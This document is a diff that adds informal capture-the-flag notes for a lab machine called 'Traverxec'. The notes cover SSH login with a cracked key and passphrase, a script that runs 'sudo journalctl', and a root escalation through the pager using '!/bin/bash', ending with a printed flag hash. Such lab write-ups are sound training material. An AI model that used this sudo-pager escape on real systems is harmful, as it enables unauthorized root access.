@@ -1,0 +1,71 @@
+## ssh -i id_rsa_david_decrypt david@10.10.10.165
+
+ - Allows us to ssh into his machine with the id_rsa password being hunter
+
+## Interesting files
+
+ - .lesshsti -- was user made...
+	- contains information about command jounalctl
+	- lots of /bin/bbash,sh, shell commands
+ - /bin
+	- server-status.head
+	- server-status.sh
+	- 'sudo journalctl'
+	
+```sh
+david@traverxec:~/bin$ cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+```
+
+
+```
+david@traverxec:~/bin$ ./server-stats.sh 
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""' 
+
+Load:  09:46:12 up 35 min,  3 users,  load average: 0.03, 0.05, 0.01
+ 
+Open nhttpd sockets: 9
+Files in the docroot: 117
+ 
+Last 5 journal log lines:
+-- Logs begin at Thu 2019-12-12 09:10:49 EST, end at Thu 2019-12-12 09:46:12 EST. --
+Dec 12 09:43:37 traverxec crontab[8300]: (www-data) LIST (www-data)
+Dec 12 09:43:37 traverxec sudo[8459]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/4 ruser=www-data rhost=  user=www-data
+Dec 12 09:43:39 traverxec sudo[8459]: pam_unix(sudo:auth): conversation failed
+Dec 12 09:43:39 traverxec sudo[8459]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Dec 12 09:43:39 traverxec sudo[8459]: www-data : command not allowed ; TTY=pts/4 ; PWD=/dev/shm ; USER=root ; COMMAND=list
+david@traverxec:~/bin$ 
+
+``
+
+# FOR ROOT
+## Remove the pipe and /usr/bin/cat from the sh script
+ - Run the command and it will run in out of less, like a man page
+ - `!/bin/bash`
+	- We have root
+
+!/bin/bash
+root@traverxec:/home/david/bin# cd /root
+root@traverxec:~# ls
+nostromo_1.9.6-1.deb  root.txt
+root@traverxec:~# cat root.txt
+9aa36a6d76f785dfd320a478f6e0d906
+
